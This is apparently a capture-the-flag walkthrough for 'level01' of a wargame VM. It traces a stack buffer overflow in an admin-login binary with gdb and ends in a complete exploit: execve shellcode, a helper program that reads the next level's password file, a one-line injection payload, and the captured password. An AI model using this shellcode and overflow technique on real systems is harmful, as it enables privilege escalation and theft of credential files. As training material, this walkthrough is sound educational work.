# level01 walkthrough

Given 32-bit elf binary, on execution it asks for the username:

    $ ./level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: admin
    verifying username....

    nope, incorrect username...

Lets disassemble the binary using gdb to try to get the username and get some sense of what's going on:

    Dump of assembler code for function main:
    0x080484d0 <+0>:	push   ebp
    0x080484d1 <+1>:	mov    ebp,esp
    0x080484d3 <+3>:	push   edi
    0x080484d4 <+4>:	push   ebx
    0x080484d5 <+5>:	and    esp,0xfffffff0
    0x080484d8 <+8>:	sub    esp,0x60
    0x080484db <+11>:	lea    ebx,[esp+0x1c]
    0x080484df <+15>:	mov    eax,0x0
    0x080484e4 <+20>:	mov    edx,0x10
    0x080484e9 <+25>:	mov    edi,ebx
    0x080484eb <+27>:	mov    ecx,edx
    0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
    0x080484ef <+31>:	mov    DWORD PTR [esp+0x5c],0x0
    0x080484f7 <+39>:	mov    DWORD PTR [esp],0x80486b8
    0x080484fe <+46>:	call   0x8048380 <puts@plt>
    0x08048503 <+51>:	mov    eax,0x80486df
    0x08048508 <+56>:	mov    DWORD PTR [esp],eax
    0x0804850b <+59>:	call   0x8048360 <printf@plt>
    0x08048510 <+64>:	mov    eax,ds:0x804a020
    0x08048515 <+69>:	mov    DWORD PTR [esp+0x8],eax
    0x08048519 <+73>:	mov    DWORD PTR [esp+0x4],0x100
    0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
    0x08048528 <+88>:	call   0x8048370 <fgets@plt>
    0x0804852d <+93>:	call   0x8048464 <verify_user_name>
    0x08048532 <+98>:	mov    DWORD PTR [esp+0x5c],eax
    0x08048536 <+102>:	cmp    DWORD PTR [esp+0x5c],0x0
    0x0804853b <+107>:	je     0x8048550 <main+128>
    0x0804853d <+109>:	mov    DWORD PTR [esp],0x80486f0
    0x08048544 <+116>:	call   0x8048380 <puts@plt>
    0x08048549 <+121>:	mov    eax,0x1
    0x0804854e <+126>:	jmp    0x80485af <main+223>
    0x08048550 <+128>:	mov    DWORD PTR [esp],0x804870d
    0x08048557 <+135>:	call   0x8048380 <puts@plt>
    0x0804855c <+140>:	mov    eax,ds:0x804a020
    0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
    0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
    0x0804856d <+157>:	lea    eax,[esp+0x1c]
    0x08048571 <+161>:	mov    DWORD PTR [esp],eax
    0x08048574 <+164>:	call   0x8048370 <fgets@plt>
    0x08048579 <+169>:	lea    eax,[esp+0x1c]
    0x0804857d <+173>:	mov    DWORD PTR [esp],eax
    0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
    0x08048585 <+181>:	mov    DWORD PTR [esp+0x5c],eax
    0x08048589 <+185>:	cmp    DWORD PTR [esp+0x5c],0x0
    0x0804858e <+190>:	je     0x8048597 <main+199>
    0x08048590 <+192>:	cmp    DWORD PTR [esp+0x5c],0x0
    0x08048595 <+197>:	je     0x80485aa <main+218>
    0x08048597 <+199>:	mov    DWORD PTR [esp],0x804871e
    0x0804859e <+206>:	call   0x8048380 <puts@plt>
    0x080485a3 <+211>:	mov    eax,0x1
    0x080485a8 <+216>:	jmp    0x80485af <main+223>
    0x080485aa <+218>:	mov    eax,0x0
    0x080485af <+223>:	lea    esp,[ebp-0x8]
    0x080485b2 <+226>:	pop    ebx
    0x080485b3 <+227>:	pop    edi
    0x080485b4 <+228>:	pop    ebp
    0x080485b5 <+229>:	ret    
    End of assembler dump.

In the disassembly above we can see that after the initial print there is an fgets call to read the username and a 'verify_user_name' function call:

    0x08048515 <+69>:	mov    DWORD PTR [esp+0x8],eax
    0x08048519 <+73>:	mov    DWORD PTR [esp+0x4],0x100
    0x08048521 <+81>:	mov    DWORD PTR [esp],0x804a040
    0x08048528 <+88>:	call   0x8048370 <fgets@plt>
    0x0804852d <+93>:	call   0x8048464 <verify_user_name>

The username is being read into a global variable placed in the .bss section, there's nothing in there to overflow so lets examine the verify_user_name function:

    (gdb) disassemble verify_user_name 
    Dump of assembler code for function verify_user_name:
    0x08048464 <+0>:	push   ebp
    0x08048465 <+1>:	mov    ebp,esp
    0x08048467 <+3>:	push   edi
    0x08048468 <+4>:	push   esi
    0x08048469 <+5>:	sub    esp,0x10
    0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690
    0x08048473 <+15>:	call   0x8048380 <puts@plt>
    0x08048478 <+20>:	mov    edx,0x804a040
    0x0804847d <+25>:	mov    eax,0x80486a8
    0x08048482 <+30>:	mov    ecx,0x7
    0x08048487 <+35>:	mov    esi,edx
    0x08048489 <+37>:	mov    edi,eax
    0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x0804848d <+41>:	seta   dl
    0x08048490 <+44>:	setb   al
    0x08048493 <+47>:	mov    ecx,edx
    0x08048495 <+49>:	sub    cl,al
    0x08048497 <+51>:	mov    eax,ecx
    0x08048499 <+53>:	movsx  eax,al
    0x0804849c <+56>:	add    esp,0x10
    0x0804849f <+59>:	pop    esi
    0x080484a0 <+60>:	pop    edi
    0x080484a1 <+61>:	pop    ebp
    0x080484a2 <+62>:	ret    
    End of assembler dump.

From the disassembly we can see that the value of the username's global variable that was read form the console is being compared to a string in the data section of the binary at address 0x80486a8 which is 7 bytes long:

    0x08048478 <+20>:	mov    edx,0x804a040
    0x0804847d <+25>:	mov    eax,0x80486a8
    0x08048482 <+30>:	mov    ecx,0x7
    0x08048487 <+35>:	mov    esi,edx
    0x08048489 <+37>:	mov    edi,eax
    0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]

The repz cmps is a 'repeat string operation prefix' asm instruction that compares strings from the esi and edi registers in the same fashion as the standard libc strcmp function would do.
Lets print out the string at the address 0x80486a8 using gdb:

    (gdb) x/7c 0x80486a8
    0x80486a8:	100 'd'	97 'a'	116 't'	95 '_'	119 'w'	105 'i'	108 'l'

The string at the address is 'dat_wil', lets try to give it to the username prompt:

    (gdb) c
    Continuing.
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password:

It worked and we got to the password prompt, let's examine that part of the disassembly:

    0x0804855c <+140>:	mov    eax,ds:0x804a020
    0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
    0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
    0x0804856d <+157>:	lea    eax,[esp+0x1c]
    0x08048571 <+161>:	mov    DWORD PTR [esp],eax
    0x08048574 <+164>:	call   0x8048370 <fgets@plt>
    0x08048579 <+169>:	lea    eax,[esp+0x1c]
    0x0804857d <+173>:	mov    DWORD PTR [esp],eax
    0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>

This time it reads the password to the preallocated memory on stack at the address esp+0x1c. The size argument passed to fgets is 0x64 (100 bytes), let's check the size of the stack buffer:

    0x080484d0 <+0>:	push   ebp
    0x080484d1 <+1>:	mov    ebp,esp
    0x080484d3 <+3>:	push   edi
    0x080484d4 <+4>:	push   ebx
    0x080484d5 <+5>:	and    esp,0xfffffff0
    0x080484d8 <+8>:	sub    esp,0x60
    0x080484db <+11>:	lea    ebx,[esp+0x1c]

Here we can see the buffer of size 0x60 being allocated, the offset in this buffer we're writing to is 0x1c so the size of the buffer to store the password is 0x60-0x1c=0x44 (68 bytes). This means that we can overflow stack and rewrite the return address which is stored on stack right before the memory we're writing to:

    0x080484d0 <+0>:	push   ebp

We can see the return address being popped from stack at the end of the main function:

    0x080484a1 <+61>:	pop    ebp
    0x080484a2 <+62>:	ret


The offset from the end of the buffer that we're about to overflow and the return address is 12 bytes because of the alignment of the buffer and 2 registers that were pushed on stack before the allocation:

    0x080484d3 <+3>:	push   edi
    0x080484d4 <+4>:	push   ebx
    0x080484d5 <+5>:	and    esp,0xfffffff0

We can examine the stack in gdb by setting a breakpoint before the fgets call and printing it directly:

    (gdb) b *main+164
    Breakpoint 6 at 0x8048574
    (gdb) run
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program: /home/users/level01/level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password: 

    Breakpoint 6, 0x08048574 in main ()
    (gdb) x/120x $sp
    0xffffd5b0:	0xcc	0xd5	0xff	0xff	0x64	0x00	0x00	0x00
    0xffffd5b8:	0xc0	0xfa	0xfc	0xf7	0x01	0x00	0x00	0x00
    0xffffd5c0:	0xf5	0xd7	0xff	0xff	0x2f	0x00	0x00	0x00
    0xffffd5c8:	0x1c	0xd6	0xff	0xff	0x00	0x00	0x00	0x00
    0xffffd5d0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
    0xffffd5d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
    0xffffd5e0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
    0xffffd5e8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
    0xffffd5f0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
    0xffffd5f8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
    0xffffd600:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
    0xffffd608:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
    0xffffd610:	0xf4	0xef	0xfc	0xf7	0x00	0x00	0x00	0x00
    0xffffd618:	0x00	0x00	0x00	0x00	0x13	0x55	0xe4	0xf7
    0xffffd620:	0x01	0x00	0x00	0x00	0xb4	0xd6	0xff	0xff

And check that our calculations are right by giving the string below to the password prompt:

    (gdb) c
    Continuing.
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccccccccdddd
    nope, incorrect password...


    Program received signal SIGSEGV, Segmentation fault.
    0x64646464 in ?? ()
    (gdb) 

We can also examine stack after the fgets call:

    (gdb) x/120x $sp
    0xffffd5b0:	0xcc	0xd5	0xff	0xff	0x64	0x00	0x00	0x00
    0xffffd5b8:	0xc0	0xfa	0xfc	0xf7	0x01	0x00	0x00	0x00
    0xffffd5c0:	0xf5	0xd7	0xff	0xff	0x2f	0x00	0x00	0x00
    0xffffd5c8:	0x1c	0xd6	0xff	0xff	0x61	0x61	0x61	0x61
    0xffffd5d0:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
    0xffffd5d8:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
    0xffffd5e0:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
    0xffffd5e8:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
    0xffffd5f0:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
    0xffffd5f8:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
    0xffffd600:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
    0xffffd608:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
    0xffffd610:	0x62	0x62	0x62	0x62	0x63	0x63	0x63	0x63
    0xffffd618:	0x63	0x63	0x63	0x63	0x64	0x64	0x64	0x64
    0xffffd620:	0x0a	0x00	0x00	0x00	0xb4	0xd6	0xff	0xff

Now if we manage to insert shellcode to the binary then we gonna be able to run anything with the level02 rights, for that we can use program's environment. For the shellcode injection part we wrote a script that should be provided with the level01 binary path as an argument and it will print an execution string to put into the override vm terminal.
Shellcode injection consists of an execve syscall to run a binary at /tmp/a location:

    executable_path = b"/tmp/a"
    asm_shellcode = """
    mov    eax,0xb
    mov    ebx,{executable_address}
    xor    ecx,ecx
    mov    edx,ecx
    int    0x80 
    """

To gain access to the next level we can write a simple program that will print the level02 password's file contents to the standard output:

    int main()
    {  
    int fd;
    char buff[1024];
    char path[] = "/home/users/level02/.pass";

    fd = open(path, O_RDONLY);
    read(fd, buff, 1024);

    printf("\n\n%s\n\n",buff);
    }

Now we need to compile this program and place it at the /tmp/a location, after that we can generate command to exploit the binary using the pawner script and execute it:

    $ gcc -m32 /tmp/main.c -o /tmp/a
    $ python -c 'print(b"dat_will\n\x90\x90\x90\x90\x90\x90\x90\x90\x2f\x74\x6d\x70\x2f\x61\x00\xb8\x0b\x00\x00\x00\xbb\xb4\xdd\xff\xff\x31\xc9\x89\xca\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xdd\xff\xff")' | env -i PWD=$PWD SHELL=$SHELL SHLVL=$SHLVL LINES=211 COLUMNS=53 /home/users/level01/level01
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: verifying username....

    Enter Password: 
    nope, incorrect password...



    PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

Profit!
